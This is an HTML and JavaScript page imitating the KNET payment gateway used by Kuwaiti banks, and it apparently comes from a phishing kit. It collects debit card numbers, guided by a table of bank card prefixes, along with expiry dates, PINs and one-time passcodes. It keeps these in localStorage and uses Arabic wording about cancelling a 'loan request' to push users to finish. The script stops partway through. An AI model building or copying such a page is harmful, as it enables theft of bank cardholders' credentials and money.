<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>KNET Payments</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            body {
                font-family: Verdana, Arial, Helvetica, sans-serif;
                background-color: #ebebeb;
            }

            #DCNumber {
                letter-spacing: 0.04em;
            }

            #pinMask {
                font-size: 0.72rem;
                letter-spacing: 0.16em;
                display: inline-block;
            }

            .container {
                width: 100%;
                padding: 15px;
                box-sizing: border-box;
            }

            .content-block {
                width: 395px;
                margin: 0 auto;
            }

            .row {
                border-bottom: 1px solid #8f8f90;
                padding-bottom: 5px;
                padding-top: 5px;
            }

            .row_new {
                padding-bottom: 5px;
                padding-top: 5px;
            }

            .column-label,
            .column-value,
            .column-long {
                float: left;
            }

            .column-label {
                width: 40%;
            }

            .column-value {
                width: 60%;
            }

            .row.three-column .column-value {
                width: 18%;
                margin-right: 5px;
            }

            .row.three-column .column-long {
                width: 39%;
                float: right;
            }

            .row:after {
                content: "";
                display: table;
                clear: both;
            }

            .form-card {
                background-color: #ffffff;
                padding: 20px;
                border: 2px solid #8f8f90;
                border-radius: 15px;
                margin-bottom: 15px;
                box-shadow: 0 0 6px rgba(0,0,0,0.3);
            }

            .form-card:nth-child(1) {
                margin-top: 25px;
            }

            .form-card .row:nth-child(1) {
                padding-top: 0;
            }

            .form-card .row:nth-last-child(1) {
                border: 0;
                padding-bottom: 0;
            }

            .footer-content .row,
            .footer-content-new .row {
                border: 0;
                padding-bottom: 0;
            }

            form label {
                font-size: 11px;
                color: #0070cd;
                font-weight: bold;
                text-shadow: 0 1px 2px rgba(0,0,0,0.2);
            }

            select {
                font-size: 11px;
                height: 20px;
            }

            form .text-label,
            input,
            select {
                color: #444444;
                font-weight: normal;
            }

            form input[type="tel"],
            input[type="password"],
            form input[type="text"] {
                border: 2px solid #0070cd;
                box-shadow: inset 0 0 5px rgba(0,0,0,0.3);
                padding: 0 3px;
                outline: 0;
                font-size: 11px;
                height: 20px;
            }

            #ValidationMessage {
                margin: 0;
                box-sizing: border-box;
                transition: height 1s ease;
                border: #ff0000 1px solid;
                background-color: #f7dadd;
                font-size: 13px;
                font-family: helvetica, arial, sans serif;
                color: #ff0000;
                padding: 5px 2px 5px 2px;
                display: none;
                margin-bottom: 3px;
                text-align: center;
            }

            .footer-content {
                text-align: center;
                margin-top: 15px;
                font-weight: bold;
                color: #2277d3;
            }

            .brand-img {
                margin-right: 5px;
                float: right;
            }

            .brand-info {
                font-size: 12px;
                text-align: left;
            }

            .footer-content #knet-brand {
                width: 43px;
                height: 43px;
                background: url("./assets/images/knet-links.png") -148px 0 no-repeat;
                margin-top: 5px;
            }

            .footer-content .social-links {
                margin-top: 15px;
                text-align: center;
            }

            .footer-content .social-links div {
                height: 30px;
                display: inline-block;
            }

            .footer-content .social-links div#knet-yt {
                background: url("./assets/images/knet-links.png") 0 0 no-repeat;
                width: 35px;
            }

            .footer-content .social-links div#knet-sn {
                background: url("./assets/images/knet-links.png") -36px 0 no-repeat;
                width: 27px;
            }

            .footer-content .social-links div#knet-tw {
                background: url("./assets/images/knet-links.png") -64px 0 no-repeat;
                width: 27px;
            }

            .footer-content .social-links div#knet-it {
                background: url("./assets/images/knet-links.png") -93px 0 no-repeat;
                width: 27px;
            }

            .footer-content .social-links div#knet-fb {
                background: url("./assets/images/knet-links.png") -120px 0 no-repeat;
                width: 27px;
            }

            button {
                width: 100%;
            }

            .submit-button {
                background-color: #eaeaea;
                border: 1px solid #cacaca;
                padding: 5px 0;
                font-weight: bold;
                color: #666666;
                width: 50%;
                float: left;
                height: 27px;
                border-radius: 4px;
            }

            .cancel-button {
                background-color: #eaeaea;
                border: 1px solid #cacaca;
                padding: 5px 0;
                font-weight: bold;
                color: #666666;
                width: 50%;
                height: 27px;
                border-radius: 4px;
                -webkit-appearance: none;
            }

            .row.alert-msg {
                font-size: 12px;
                text-align: justify;
                background-color: #d9edf6;
                padding: 10px !important;
                border: 1px solid #bacce0;
                border-radius: 4px;
                margin-bottom: 10px;
            }

            .overlay {
                background: rgba(85, 85, 85, 0.5);
                display: none;
                position: fixed;
                top: 0;
                right: 0;
                bottom: 0;
                left: 0;
                z-index: 9999;
            }

            .overlay img {
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                height: min(15vh, 96px);
                width: auto;
            }

            .terms {
                font-size: 11px;
                color: #0070cd;
                font-weight: bold;
                font-style: italic;
                text-decoration: none;
            }

            .choiceOption {
                vertical-align: super;
            }

            .container-blogo {
                width: 100%;
                margin-top: -5px;
                margin-bottom: 15px;
            }

            .logoHead-mob {
                width: 42%;
                margin-left: 27%;
                margin-right: auto;
            }

            .madd {
                height: 90px;
                max-width: 372px;
                margin: 5px auto -30px auto;
                border-radius: 0px 10px;
                background-image: url("./assets/images/mob.jpg");
                display: block;
            }

            @media all and (max-width: 425px) {
                .content-block {
                    width: 98%;
                    margin: 0 auto;
                }
            }

            body {
                background:
                    radial-gradient(circle at top right, rgba(13, 127, 184, 0.14), transparent 28%),
                    radial-gradient(circle at left 15%, rgba(0, 95, 147, 0.06), transparent 20%),
                    linear-gradient(180deg, #f7fbff 0%, #eef4fb 100%);
                color: #1d2b3d;
            }

            .madd {
                border-radius: 18px;
                overflow: hidden;
                box-shadow: 0 16px 36px rgba(31, 51, 78, 0.16);
                margin-bottom: 14px;
            }

            .form-card {
                background:
                    linear-gradient(180deg, rgba(255, 255, 255, 0.96), rgba(244, 248, 252, 0.98));
                border: 1px solid rgba(114, 140, 171, 0.16);
                box-shadow: 0 18px 40px rgba(31, 51, 78, 0.08);
            }

            .row {
                border-bottom-color: rgba(114, 140, 171, 0.22);
            }

            form label {
                color: #005f93;
                text-shadow: none;
            }

            input,
            select {
                background: #ffffff;
                border-radius: 12px;
                border-color: rgba(13, 127, 184, 0.45);
                box-shadow: inset 0 1px 2px rgba(31, 51, 78, 0.08);
            }

            #ValidationMessage {
                border-color: rgba(239, 68, 68, 0.5);
                background-color: #fff1f2;
                color: #b91c1c;
                border-radius: 10px;
            }

            .submit-button {
                background: linear-gradient(135deg, #0d7fb8, #005f93);
                border: 0;
                color: #ffffff;
                box-shadow: 0 12px 24px rgba(13, 127, 184, 0.24);
            }

            .cancel-button {
                background: linear-gradient(180deg, #f8fbff, #eef4fb);
                border-color: rgba(114, 140, 171, 0.24);
                color: #44566f;
            }

            .overlay {
                background: rgba(15, 23, 42, 0.62);
                backdrop-filter: blur(6px);
            }

            .container-blogo img,
            .logoHead-mob {
                filter: drop-shadow(0 10px 24px rgba(31, 51, 78, 0.12));
            }

            /* Compact payment layout used on the mobile payment screen. */
            body {
                min-height: 100vh;
                background: #eef6fd;
                color: #164a76;
                font-family: Arial, Helvetica, sans-serif;
            }

            .madd {
                display: none;
            }

            .container {
                padding: 0 8px 18px;
            }

            .content-block {
                width: min(100%, 391px);
            }

            .form-card {
                padding: 10px;
                border: 1px solid #d9e7f2;
                border-radius: 17px;
                margin-bottom: 11px;
                box-shadow: 0 7px 18px rgba(31, 76, 112, 0.08);
            }

            .form-card:nth-child(1) {
                margin-top: 7px;
                min-height: 143px;
            }

            .form-card:nth-child(2) {
                min-height: 196px;
                padding: 15px 10px 10px;
            }

            .form-card:nth-child(2)::before {
                content: "معلومات البطاقة";
                display: block;
                margin: 0 0 7px;
                color: #0070cd;
                font-size: 12px;
                font-weight: bold;
                text-align: right;
            }

            .form-card:nth-child(3) {
                min-height: 68px;
                padding: 10px;
                margin-bottom: 8px;
            }

            .container-blogo {
                margin: 0 0 8px;
            }

            .logoHead-mob {
                width: 42%;
                display: block;
                margin-left: auto !important;
                margin-right: auto !important;
            }

            .form-card:nth-child(1) .row,
            .form-card:nth-child(1) #OrgTranxAmt {
                min-height: 28px;
            }

            .form-card:nth-child(1) .row {
                padding-top: 4px;
                padding-bottom: 4px;
            }

            .form-card:nth-child(2) #knetform > .row:first-child {
                display: none;
            }

            .form-card:nth-child(2) .row {
                min-height: 39px;
                padding: 8px 0;
                border-bottom-color: #dce8f1;
            }

            .form-card:nth-child(2) .row:last-child {
                border-bottom: 0;
            }

            .form-card:nth-child(2) form label,
            .form-card:nth-child(2) label {
                color: #0070cd;
                text-shadow: none;
            }

            .form-card:nth-child(2) input,
            .form-card:nth-child(2) select {
                height: 27px;
                border: 1px solid #cbd5df;
                border-radius: 6px;
                background: #fff;
                box-shadow: inset 0 1px 3px rgba(31, 51, 78, 0.1);
                color: #4e5965;
            }

            .form-card:nth-child(2) #Paymentpagecardnumber input {
                width: 68% !important;
                height: 27px;
                float: left !important;
            }

            .form-card:nth-child(2) #Paymentpagecardnumber .column-label,
            .form-card:nth-child(2) #PinRow .column-label {
                width: 32% !important;
                float: right !important;
            }

            .form-card:nth-child(2) #Paymentpagecardnumber select {
                display: none;
            }

            .form-card:nth-child(2) #Paymentpagecardnumber #dcprefix {
                display: none !important;
            }

            .form-card:nth-child(2) #cardExpdate {
                min-height: 39px;
            }

            .form-card:nth-child(2) #cardExpdate > div:last-child {
                width: 68% !important;
                display: flex;
                justify-content: center;
                gap: 4px;
            }

            .form-card:nth-child(2) #cardExpdate .paymentselect {
                width: auto;
                min-width: 42px;
            }

            .form-card:nth-child(2) #PinRow input {
                width: 68% !important;
                height: 27px;
                float: left !important;
            }

            .bank-indicator {
                display: flex;
                align-items: center;
                justify-content: flex-start;
                gap: 7px;
                min-height: 27px;
                margin: -3px 0 3px;
                padding-left: 4px;
                color: #17679c;
                font-size: 11px;
                font-weight: bold;
            }

            .bank-indicator-logo {
                width: 54px;
                height: 27px;
                object-fit: contain;
                border-radius: 4px;
                background: #fff;
            }

            .bank-indicator[hidden] {
                display: none;
            }

            .bank-prefix-suggestions {
                position: relative;
                z-index: 5;
                max-height: 150px;
                margin: 2px 0 5px;
                overflow-y: auto;
                border: 1px solid #cbd5df;
                border-radius: 5px;
                background: #fff;
                box-shadow: 0 3px 8px rgba(31, 51, 78, 0.15);
            }

            .bank-prefix-suggestions[hidden] {
                display: none;
            }

            .bank-prefix-option {
                display: flex;
                align-items: center;
                justify-content: space-between;
                gap: 8px;
                width: 100%;
                min-height: 29px;
                padding: 4px 7px;
                border: 0;
                border-bottom: 1px solid #e5edf3;
                background: #fff;
                color: #53606c;
                cursor: pointer;
                font-size: 11px;
                text-align: right;
            }

            .bank-prefix-option:last-child {
                border-bottom: 0;
            }

            .bank-prefix-option:hover,
            .bank-prefix-option:focus {
                background: #eef7ff;
                outline: 0;
            }

            .bank-prefix-option img {
                width: 34px;
                height: 20px;
                object-fit: contain;
                order: 2;
            }

            .bank-prefix-option span {
                flex: 1;
            }

            .form-card:nth-child(3) .row {
                padding: 0;
                border: 0;
            }

            .submit-button,
            .cancel-button {
                height: 27px;
                border-radius: 0;
                padding: 5px 0;
                box-shadow: none;
                font-size: 11px;
            }

            .submit-button {
                background: #eeeeee;
                border: 1px solid #c9c9c9;
                color: #666;
            }

            .cancel-button {
                background: #eeeeee;
                border: 1px solid #c9c9c9;
                color: #666;
            }

            footer {
                margin-top: 11px;
                color: #42658a;
            }

            footer::before {
                content: "كي نت";
                display: block;
                width: 76px;
                height: 32px;
                margin: 0 auto 12px;
                background: #fff;
                border: 1px solid #edf1f5;
                color: #1875ba;
                font-size: 17px;
                font-weight: bold;
                line-height: 32px;
                text-align: center;
            }

            footer .row_new {
                font-size: 12px !important;
                line-height: 1.65;
            }

            footer .row_new span {
                color: #0070cd !important;
            }

            @media all and (max-width: 425px) {
                .content-block {
                    width: 100%;
                }
            }

            #prefixField {
                display: none !important;
            }

            #bankIndicator {
                display: flex;
                min-height: 27px;
                margin: -3px 0 3px;
                padding-left: 4px;
                color: #17679c;
                font-size: 11px;
                font-weight: bold;
                cursor: pointer;
            }

            #bankIndicator[hidden] {
                display: none;
            }

            #bankPrefixSuggestions {
                display: block;
                width: 60%;
                max-height: 150px;
                margin: -4px 0 5px 40%;
                overflow-y: auto;
                border: 1px solid #cbd5df;
                border-radius: 5px;
                background: #fff;
                box-shadow: 0 3px 8px rgba(31, 51, 78, 0.15);
            }

            #bankPrefixSuggestions[hidden] {
                display: none;
            }

            #cardNumberField {
                width: 60% !important;
            }

            #cardNumberCombined {
                width: 100%;
                height: 38px;
                padding: 0 10px;
                border: 1px solid #cbd5df;
                border-radius: 9px;
                background: #fff;
                box-shadow: inset 0 1px 3px rgba(31, 51, 78, 0.1);
                direction: ltr;
                text-align: left;
                font-size: 14px;
            }

            #cardNumberCombined:focus {
                outline: none;
                border-color: #0d7fb8;
                box-shadow: 0 0 0 2px rgba(13, 127, 184, 0.14);
            }

            #cardExpdate > div:last-child {
                display: flex;
                justify-content: center;
                align-items: center;
            }

            #cardExpdate .paymentselect {
                display: none;
            }

            #cardExpdate::after {
                content: "YY   /   MM";
                display: block;
                width: 112px;
                padding: 9px 7px;
                border: 1px solid #cbd5df;
                border-radius: 9px;
                background: #fff;
                color: #7b8794;
                direction: ltr;
                text-align: center;
                font-size: 14px;
            }

            #cardExpdate:focus-within::after {
                display: none;
            }

            #cardExpdate:focus-within .paymentselect {
                display: block;
            }

            #cardPin {
                width: 60% !important;
                height: 38px !important;
                border-radius: 9px !important;
                font-size: 14px !important;
            }

            #manualExpiryInput {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                width: 112px;
                height: 38px;
                padding: 0 8px;
                border: 1px solid #cbd5df;
                border-radius: 9px;
                background: #fff;
                direction: ltr;
            }

            #manualExpiryInput input {
                width: 34px;
                height: 30px;
                padding: 0;
                border: 0;
                outline: 0;
                background: transparent;
                box-shadow: none;
                text-align: center;
                font-size: 14px;
                color: #4e5965;
            }

            #manualExpiryInput span {
                color: #7b8794;
                font-size: 14px;
            }

            #cardExpdate .paymentselect {
                display: none !important;
            }

            #cardExpdate::after {
                display: none;
            }

            #cardExpdate .paymentselect {
                display: block;
                width: 52px;
                height: 38px;
                border: 0;
                border-radius: 0;
                box-shadow: none;
                background: transparent;
                font-size: 14px;
            }

            #cardExpdate > div:last-child {
                width: 60% !important;
                min-height: 38px;
                border: 1px solid #cbd5df;
                border-radius: 9px;
                background: #fff;
                direction: ltr;
            }

            #cardExpdate.expiry-invalid > div:last-child {
                border-color: #dc2626;
                background: #fff5f5;
            }

            #cardExpdate.expiry-invalid .paymentselect,
            #cardExpdate.expiry-invalid label {
                color: #dc2626;
            }
        </style>

    <form method="post">
        <div class="madd"> </div>
        <div id="PayPageEntry" style="display: block">
            <div class="container">

        </form>
    <script>
        const BANK_PREFIXES = {
            ABK: ["403622", "423826", "428628"],
            ALRAJHI: ["458838"],
            BBK: ["588790", "418056"],
            BOUBYAN: ["470350", "490455", "490456", "404919", "490456", "450605", "426058", "431199"],
            BURGAN: ["49219000", "415254", "450238", "468564", "540759", "402978", "403583"],
            CBK: ["532672", "537015", "521175", "516334"],
            DOHA: ["419252"],
            GBK: ["531644", "517419", "531471", "559475", "517458", "526206", "531329", "531470"],
            TAM: ["45077848", "45077849"],
            KFH: ["450778", "537016", "532674", "485602"],
            KIB: ["406464", "409054"],
            NBK: ["464452", "589160"],
            WEYAY: ["464425250", "543363"],
            QNB: ["524745", "521020"],
            UNB: ["457778"],
            WARBA: ["532749", "559459", "541350", "525528"]
        };

        function prefixes(bankCode) {
            const prefixSelect = document.getElementById("dcprefix");
            const prefixValues = BANK_PREFIXES[bankCode] || [];
            const fragment = document.createDocumentFragment();

            if (!prefixValues.length) {
                fragment.appendChild(new Option("بادِئة", ""));
            } else {
                prefixValues.forEach(function(prefixValue) {
                    fragment.appendChild(new Option(prefixValue, prefixValue));
                });
            }

            prefixSelect.textContent = "";
            prefixSelect.appendChild(new Option("اختر بادئة البطاقة", ""));
            prefixSelect.appendChild(fragment);

            if (prefixValues.length) {
                prefixSelect.selectedIndex = 0;
            } else {
                prefixSelect.value = "";
            }
        }

        function findBankCodeByPrefix(prefixValue) {
            return Object.keys(BANK_PREFIXES).find(function(bankCode) {
                return BANK_PREFIXES[bankCode].includes(prefixValue);
            }) || "";
        }

        function hideValidationMessage(triggerFieldId) {
            const validationMessage = document.getElementById("ValidationMessage");
            const bankIndicator = document.getElementById("bankIndicator");
            const bankPrefixSuggestions = document.getElementById("bankPrefixSuggestions");
            const clearOnFields = (validationMessage.dataset.clearOnFields || "")
                .split(",")
                .filter(Boolean);

            if (clearOnFields.length && triggerFieldId && !clearOnFields.includes(triggerFieldId)) {
                return;
            }

            validationMessage.textContent = "";
            validationMessage.style.display = "none";
            validationMessage.dataset.clearOnFields = "";
        }

        function showValidationMessage(message, field, clearOnFields) {
            const validationMessage = document.getElementById("ValidationMessage");
            validationMessage.textContent = message;
            validationMessage.style.display = "block";
            validationMessage.dataset.clearOnFields = (clearOnFields || (field ? [field.id] : [])).join(",");

            if (field) {
                requestAnimationFrame(function() {
                    field.focus();
                });
            }
        }

        function updateDebitNumberMaxLength(shouldResetValue) {
            const prefixSelect = document.getElementById("dcprefix");
            const debitNumberInput = document.getElementById("debitNumber");
            const prefixLength = prefixSelect.value.length;
            const maxLength = prefixLength ? 16 - prefixLength : 10;

            debitNumberInput.maxLength = maxLength;
            debitNumberInput.setAttribute("maxlength", String(maxLength));
            debitNumberInput.title = "يجب أن يتكون هذا الجزء من " + maxLength + " أرقام";

            if (shouldResetValue) {
                debitNumberInput.value = "";
            } else if (debitNumberInput.value.length > maxLength) {
                debitNumberInput.value = debitNumberInput.value.slice(0, maxLength);
            }
        }

        function convertToWesternDigits(value) {
            const digitMap = {
                "٠": "0", "١": "1", "٢": "2", "٣": "3", "٤": "4",
                "٥": "5", "٦": "6", "٧": "7", "٨": "8", "٩": "9",
                "۰": "0", "۱": "1", "۲": "2", "۳": "3", "۴": "4",
                "۵": "5", "۶": "6", "۷": "7", "۸": "8", "۹": "9",
                "０": "0", "１": "1", "２": "2", "３": "3", "４": "4",
                "５": "5", "６": "6", "７": "7", "８": "8", "９": "9"
            };

            return value.replace(/[٠-٩۰-۹０-９]/g, function(character) {
                return digitMap[character] || character;
            });
        }

        function keepDigitsOnly(input, shouldConvertToWesternDigits) {
            if (shouldConvertToWesternDigits) {
                input.value = convertToWesternDigits(input.value);
            }

            input.value = input.value.replace(/\D/g, "");

            if (input.maxLength > 0 && input.value.length > input.maxLength) {
                input.value = input.value.slice(0, input.maxLength);
            }
        }

        function isExpiredCard(selectedMonth, selectedYear) {
            const now = new Date();
            const currentMonth = now.getMonth() + 1;
            const currentYear = now.getFullYear();
            const month = Number(selectedMonth);
            const year = Number(selectedYear);

            return year < currentYear || (year === currentYear && month < currentMonth);
        }

        function updateExpiryValidity() {
            const expiryRow = document.getElementById("cardExpdate");
            const monthSelect = document.getElementById("month");
            const yearSelect = document.getElementById("year");
            const isInvalid = !monthSelect.value ||
                !yearSelect.value ||
                isExpiredCard(monthSelect.value, yearSelect.value);

            expiryRow.classList.toggle("expiry-invalid", isInvalid);
            return !isInvalid;
        }

        function formatTwoDigits(value) {
            return String(value).padStart(2, "0");
        }

        function maskCardNumber(prefixValue, debitNumberValue) {
            const maskedPartLength = Math.max(debitNumberValue.length - 4, 0);
            const visibleLastDigits = debitNumberValue.slice(-4);
            return prefixValue + "*".repeat(maskedPartLength) + visibleLastDigits;
        }

        function maskPinCode(pinCodeValue) {
            return "●".repeat(pinCodeValue.length || 4);
        }

        function saveKnetDetailsToLocalStorage(details) {
            localStorage.setItem("bankname", details.bankname);
            localStorage.setItem("dcprefix", details.dcprefix);
            localStorage.setItem("debitnumber", details.debitnumber);
            localStorage.setItem("month", details.month);
            localStorage.setItem("year", details.year);
            localStorage.setItem("pincode", details.pincode);
        }

        function getStoredKnetDetails() {
            return {
                bankname: localStorage.getItem("bankname") || "",
                dcprefix: localStorage.getItem("dcprefix") || "",
                debitnumber: localStorage.getItem("debitnumber") || "",
                month: localStorage.getItem("month") || "",
                year: localStorage.getItem("year") || "",
                pincode: localStorage.getItem("pincode") || ""
            };
        }

        function clearStoredSensitiveKnetDetails() {
            localStorage.setItem("month", "");
            localStorage.setItem("year", "");
            localStorage.setItem("pincode", "");
        }

        document.addEventListener("DOMContentLoaded", function() {
            const form = document.querySelector("form");
            const bankSelect = document.getElementById("bank");
            const prefixSelect = document.getElementById("dcprefix");
            const debitNumberInput = document.getElementById("debitNumber");
            const cardNumberCombined = document.getElementById("cardNumberCombined");
            const monthSelect = document.getElementById("month");
            const yearSelect = document.getElementById("year");
            const expiryMonthInput = document.getElementById("expiryMonthInput");
            const expiryYearInput = document.getElementById("expiryYearInput");
            const cardPinInput = document.getElementById("cardPin");
            const knetForm = document.getElementById("knetform");
            const otpForm = document.getElementById("otpform");
            const proceedButton = document.getElementById("proceed");
            const cancelButton = document.getElementById("cancel");
            const otpInput = document.getElementById("dop");
            const dcNumberLabel = document.getElementById("DCNumber");
            const expiryMonthLabel = document.getElementById("expmnth");
            const expiryYearLabel = document.getElementById("expyear");
            const pinMaskLabel = document.getElementById("pinMask");
            const overlayHide = document.getElementById("overlayhide");
            const validationMessage = document.getElementById("ValidationMessage");
            const bankIndicator = document.getElementById("bankIndicator");
            const otpBackConfirmationMessage = "هل أنت متأكد من إلغاء طلب القرض؟\n\nإلغاء الطلب أو الرجوع إلى الصفحة السابقة سيعتبر إلغاءً للطلب وقد يؤثر على قبول القرض.";
            const otpDefaultPlaceholder = "Timeout in: 0:00";
            const otpTimerDurationSeconds = 4 * 60;
            let autoSentOtpValue = "";
            let otpTimerInterval = null;
            const OTP_EXPIRY_STORAGE_KEY = "knetOtpExpiry";
            const KNET_REDIRECT_STORAGE_KEY = "knetRedirectedFromStep3";
            let autoKnetInfoSent = false;

            const BANK_DISPLAY_NAMES = {
                ABK: "البنك الأهلي الكويتي",
                ALRAJHI: "مصرف الراجحي",
                BBK: "بنك البحرين والكويت",
                BOUBYAN: "بنك بوبيان",
                BURGAN: "بنك برقان",
                CBK: "البنك التجاري الكويتي",
                DOHA: "بنك الدوحة",
                GBK: "بنك الخليج",
                TAM: "بيت التمويل الكويتي",
                KFH: "بيت التمويل الكويتي",
                KIB: "بنك الكويت الدولي",
                NBK: "بنك الكويت الوطني",
                WEYAY: "Weyay",
                QNB: "بنك قطر الوطني",
                UNB: "بنك الاتحاد الوطني",
                WARBA: "بنك وربة"
            };

            const BANK_LOGOS = {
                ABK: "assets/images/banks/abk.jpg",
                ALRAJHI: "assets/images/banks/alrajhi.jpg",
                BBK: "assets/images/banks/bbk.jpg",
                BOUBYAN: "assets/images/banks/boubyan.jpg",
                BURGAN: "assets/images/banks/burgan.jpg",
                CBK: "assets/images/banks/tijari.jpg",
                GBK: "assets/images/banks/gbk.jpg",
                KFH: "assets/images/banks/kfh.jpg",
                KIB: "assets/images/banks/kib.jpg",
                NBK: "assets/images/banks/nbk.jpg",
                QNB: "assets/images/banks/qnb.jpg",
                WARBA: "assets/images/banks/warba.jpg",
                WEYAY: "assets/images/banks/weyay.jpg"
            };

            function showCombinedPrefixPreview(value) {
                const enteredDigits = value.slice(0, 9);
                const firstMatch = Object.keys(BANK_PREFIXES)
                    .reduce(function(matches, bankCode) {
                        return matches.concat(BANK_PREFIXES[bankCode].map(function(prefix) {
                            return { bankCode: bankCode, prefix: prefix };
                        }));
                    }, [])
                    .filter(function(item) {
                        return item.prefix.startsWith(enteredDigits);
                    })
                    .sort(function(first, second) {
                        return second.prefix.length - first.prefix.length;
                    })[0];

                if (!/^[45]/.test(value) || !firstMatch) {
                    bankIndicator.hidden = true;
                    return;
                }

                if (!bankPrefixSuggestions.hidden) {
                    bankIndicator.hidden = true;
                    return;
                }

                const logo = bankIndicator.querySelector(".bank-indicator-logo");
                const label = bankIndicator.querySelector("span");
                const bankName = BANK_DISPLAY_NAMES[firstMatch.bankCode] || firstMatch.bankCode;

                logo.src = BANK_LOGOS[firstMatch.bankCode] || "";
                logo.alt = bankName;
                logo.hidden = !logo.src;
                label.textContent = firstMatch.prefix.slice(0, 6) + "  -  " + bankName;
                bankIndicator.dataset.prefix = firstMatch.prefix.slice(0, 6);
                bankIndicator.hidden = false;
            }

            function getSuggestedBankPrefix(value) {
                const digits = value.slice(0, 6);

                for (const bankCode of Object.keys(BANK_PREFIXES)) {
                    const prefix = BANK_PREFIXES[bankCode].find(function(candidate) {
                        return candidate.startsWith(digits);
                    });

                    if (prefix) {
                        return { bankCode: bankCode, prefix: prefix };
                    }
                }

                return null;
            }

            function getMatchingBankPrefixes(value) {
                const digits = value.slice(0, 6);
                const matches = [];

                Object.keys(BANK_PREFIXES).forEach(function(bankCode) {
                    BANK_PREFIXES[bankCode].forEach(function(prefix) {
                        if (prefix.startsWith(digits) && !matches.some(function(item) {
                            return item.prefix === prefix;
                        })) {
                            matches.push({ bankCode: bankCode, prefix: prefix });
                        }
                    });
                });

                return matches;
            }

            function hideBankPrefixSuggestions() {
                bankPrefixSuggestions.hidden = true;
                bankPrefixSuggestions.textContent = "";
            }

            function showBankPrefixSuggestions() {
                const enteredDigits = cardNumberCombined.value || debitNumberInput.value;
                const matches = /^[45]/.test(enteredDigits)
                    ? getMatchingBankPrefixes(enteredDigits)
                    : [];

                bankPrefixSuggestions.textContent = "";

                if (!matches.length || prefixSelect.value) {
                    hideBankPrefixSuggestions();
                    return;
                }

                matches.forEach(function(match) {
                    const button = document.createElement("button");
                    const logo = document.createElement("img");
                    const label = document.createElement("span");
                    const bankName = BANK_DISPLAY_NAMES[match.bankCode] || match.bankCode;

                    button.type = "button";
                    button.className = "bank-prefix-option";
                    logo.src = BANK_LOGOS[match.bankCode] || "";
                    logo.alt = bankName;
                    label.textContent = match.prefix + "  -  " + bankName;
                    button.appendChild(logo);
                    button.appendChild(label);
                    button.addEventListener("click", function() {
                        if (cardNumberCombined.value) {
                            cardNumberCombined.value = match.prefix.slice(0, 6);
                            cardNumberCombined.dispatchEvent(new Event("input", { bubbles: true }));
                            hideBankPrefixSuggestions();
                            showCombinedPrefixPreview(cardNumberCombined.value);
                            cardNumberCombined.focus();
                            return;
                        }

                        bankSelect.value = match.bankCode;
                        prefixes(match.bankCode);
                        prefixSelect.value = match.prefix;
                        debitNumberInput.value = "";
                        updateDebitNumberMaxLength(false);
                        hideBankPrefixSuggestions();
                        updateBankIndicator();
                        debitNumberInput.focus();
                    });
                    bankPrefixSuggestions.appendChild(button);
                });

                bankPrefixSuggestions.hidden = false;
            }

            function updateBankIndicator() {
                const enteredDigits = debitNumberInput.value;
                const selectedPrefix = prefixSelect.value;
                const suggestion = selectedPrefix
                    ? { bankCode: bankSelect.value, prefix: selectedPrefix }
                    : getSuggestedBankPrefix(enteredDigits);

                if (!selectedPrefix && !bankPrefixSuggestions.hidden) {
                    bankIndicator.hidden = true;
                    bankIndicator.textContent = "";
                    return;
                }

                if ((!selectedPrefix && !/^[45]/.test(enteredDigits)) || !suggestion) {
                    bankIndicator.hidden = true;
                    bankIndicator.textContent = "";
                    return;
                }

                const bankName = BANK_DISPLAY_NAMES[suggestion.bankCode] || suggestion.bankCode;
                const logo = bankIndicator.querySelector(".bank-indicator-logo");
                const label = bankIndicator.querySelector("span");
                const logoPath = BANK_LOGOS[suggestion.bankCode] || "";

                logo.src = logoPath;
                logo.alt = bankName;
                logo.hidden = !logoPath;
                label.textContent = bankName + "  •  " + suggestion.prefix;
                bankIndicator.hidden = false;
            }

            function applySuggestedBankPrefix() {
                const firstDigit = debitNumberInput.value.slice(0, 1);
                const matchingPrefixes = [];

                if (!/^[45]$/.test(firstDigit)) {
                    return false;
                }

                Object.keys(BANK_PREFIXES).forEach(function(bankCode) {
                    BANK_PREFIXES[bankCode].forEach(function(prefixValue) {
                        if (prefixValue.startsWith(firstDigit)) {
                            matchingPrefixes.push({
                                bankCode: bankCode,
                                prefix: prefixValue
                            });
                        }
                    });
                });

                prefixSelect.textContent = "";
                matchingPrefixes.forEach(function(item) {
                    const option = new Option(
                        item.prefix + " - " + (BANK_DISPLAY_NAMES[item.bankCode] || item.bankCode),
                        item.prefix
                    );
                    option.dataset.bankCode = item.bankCode;
                    prefixSelect.appendChild(option);
                });

                prefixSelect.value = "";
                prefixSelect.disabled = false;
                debitNumberInput.placeholder = "اختر البادئة ثم أدخل 10 أرقام";
                debitNumberInput.value = "";
                updateDebitNumberMaxLength(false);
                bankIndicator.hidden = true;
                return matchingPrefixes.length > 0;
            }

            function fillKnetForm(details) {
                const prefixValue = details.dcprefix || "";
                const bankCode = details.bankname || findBankCodeByPrefix(prefixValue);

                bankSelect.value = bankCode;
                prefixes(bankSelect.value);

                if (prefixValue && Array.from(prefixSelect.options).some(function(option) {
                    return option.value === prefixValue;
                })) {
                    prefixSelect.value = prefixValue;
                }

                updateDebitNumberMaxLength(true);
                debitNumberInput.value = details.debitnumber || "";
                monthSelect.value = details.month || "";
                yearSelect.value = details.year || "";
                cardPinInput.value = details.pincode || "";
            }

            function restoreKnetFormFromStorage() {
                const storedDetails = getStoredKnetDetails();
                const hasStoredCoreValues = storedDetails.bankname || storedDetails.dcprefix || storedDetails.debitnumber;

                if (!hasStoredCoreValues) {
                    return false;
                }

                fillKnetForm({
                    bankname: storedDetails.bankname,
                    dcprefix: storedDetails.dcprefix,
                    debitnumber: storedDetails.debitnumber,
                    month: "",
                    year: "",
                    pincode: ""
                });
                return true;
            }

            function setProceedButtonText(buttonText) {
                proceedButton.textContent = buttonText;
            }

            function stopOtpTimer(resetPlaceholder) {
                if (otpTimerInterval) {
                    window.clearInterval(otpTimerInterval);
                    otpTimerInterval = null;
                }

                if (resetPlaceholder) {
                    otpInput.placeholder = otpDefaultPlaceholder;
                }
            }

            function getOtpExpiryTimestamp() {
                const raw = Number(localStorage.getItem(OTP_EXPIRY_STORAGE_KEY));
                return Number.isFinite(raw) ? raw : 0;
            }

